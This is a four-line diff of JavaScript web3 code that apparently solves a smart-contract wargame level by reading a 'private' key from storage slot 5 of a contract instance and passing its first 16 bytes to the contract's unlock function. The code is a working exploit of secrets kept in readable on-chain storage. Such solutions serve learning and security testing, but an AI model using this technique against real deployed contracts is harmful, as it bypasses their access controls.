@@ -1,0 +1,4 @@
+// key is stored in slot 5
+key = await web3.eth.getStorageAt(instance, 5)
+// take first 16 bytes from key
+contract.unlock(key.slice(0,34))
